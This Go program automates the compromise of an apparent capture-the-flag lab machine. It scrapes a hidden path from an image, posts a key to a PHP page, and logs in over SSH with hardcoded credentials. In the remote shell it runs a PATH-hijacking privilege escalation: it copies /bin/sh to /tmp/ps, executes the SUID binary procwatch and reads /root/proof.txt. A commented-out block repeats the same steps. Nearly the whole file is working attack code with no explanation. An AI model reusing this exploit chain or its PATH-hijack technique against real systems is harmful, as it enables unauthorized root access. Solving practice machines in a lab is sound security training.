package main

import (
	"log"
	"os"

	//"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"net/url"

	"net/http"
)

func main() {
	ip := "http://192.168.1.141/"
	fileUrl := ip + "main.gif"
	resp, err := http.Get(fileUrl)
	if err != nil {
		fmt.Println("asd")
	}
	defer resp.Body.Close()
	image, _ := ioutil.ReadAll(resp.Body)
	dir := string(image[21:31])

	resp, err = http.PostForm(ip+dir+"/index.php", url.Values{
		"key": {"elite"},
	})
	defer resp.Body.Close()
	file, _ := ioutil.ReadAll(resp.Body)

	resp, err = http.Get(ip + dir + "/" + string(file[49:62]))
	if err != nil {
		fmt.Println("asd")
	}
	file, _ = ioutil.ReadAll(resp.Body)
	username := "ramses"
	password := "omega"
	hostname := "192.168.1.141"
	port := "777"

	// SSH client config
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		// Non-production only
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Connect to host
	client, err := ssh.Dial("tcp", hostname+":"+port, config)
	if err != nil {
		log.Fatal(err)
	}
	defer client.Close()

	// Create sesssion
	sess, err := client.NewSession()
	if err != nil {
		log.Fatal("Failed to create session: ", err)
	}
	defer sess.Close()

	// StdinPipe for commands
	stdin, err := sess.StdinPipe()
	if err != nil {
		log.Fatal(err)
	}

	// Uncomment to store output in variable
	//var b bytes.Buffer
	//sess.Stdout = &amp;b
	//sess.Stderr = &amp;b

	// Enable system stdout
	// Comment these if you uncomment to store in variable
	sess.Stdout = os.Stdout
	sess.Stderr = os.Stderr

	// Start remote shell
	err = sess.Shell()
	if err != nil {
		log.Fatal(err)
	}

	// send the commands
	commands := []string{
		"export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games",
		"cp /bin/sh /tmp/ps",
		"/var/www/backup/procwatch",
		"cat /root/proof.txt",
		"exit",
	}
	for _, cmd := range commands {
		_, err = fmt.Fprintf(stdin, "%s\n", cmd)
		if err != nil {
			log.Fatal(err)
		}
	}

	// Wait for sess to finish
	err = sess.Wait()
	if err != nil {
		log.Fatal(err)
	}
}

/*
connectToHost("ramses", "192.168.1.141:777")
	if err != nil {
		panic(err)
	}
	//out, err := session.CombinedOutput("export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games && cp /bin/sh /tmp/ps && /var/www/backup/procwatch && id")

}

func connectToHost(user, host string) (*ssh.Client, *ssh.Session, error) {
	var pass ="omega"

	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
	}
	sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()

	client, err := ssh.Dial("tcp", host, sshConfig)
	if err != nil {
		return nil, nil, err
	}

	session, err := client.NewSession()
	if err != nil {
		client.Close()
		return nil, nil, err
	}
	/*
	//session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	//in, _ := session.StdinPipe()
	//out,_ := session.StdoutPipe()

	// Set up terminal modes
	modes := ssh.TerminalModes{
		ssh.ECHO:          0,     // disable echoing
		ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud
		ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud
	}

	// Request pseudo terminal
	if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
		log.Fatalf("request for pseudo terminal failed: %s", err)
	}

	// Start remote shell
	if err := session.Shell(); err != nil {
		log.Fatalf("failed to start shell: %s", err)
	}


	var b bytes.Buffer
	session.Stdout = &b
	if err := session.Run("export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"); err != nil {
		panic("Failed to run: " + err.Error())
	}
	fmt.Println(b.String())

	if err := session.Run("cp /bin/sh /tmp/ps"); err != nil {
		panic("Failed to run: " + err.Error())
	}
	fmt.Println(b.String())

	if err := session.Run("/var/www/backup/procwatch"); err != nil {
		panic("Failed to run: " + err.Error())
	}
	fmt.Println(b.String())

	if err := session.Run("id"); err != nil {
		panic("Failed to run: " + err.Error())
	}
	fmt.Println(b.String())
	/*
	fmt.Fprint(in, "export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\n")
	fmt.Fprint(in, "cp /bin/sh /tmp/ps")

	fmt.Fprint(in, "./procwatch")
	fmt.Fprint(in, "id")
	fmt.Fprint(os.Stdout., out)

	//fmt.Fprint()

	// Accepting commands

	for {
		reader := bufio.NewReader(os.Stdin)
		str, _ := reader.ReadString('\n')
		fmt.Fprint(in, str)
	}

	return client, session, nil

}


*/
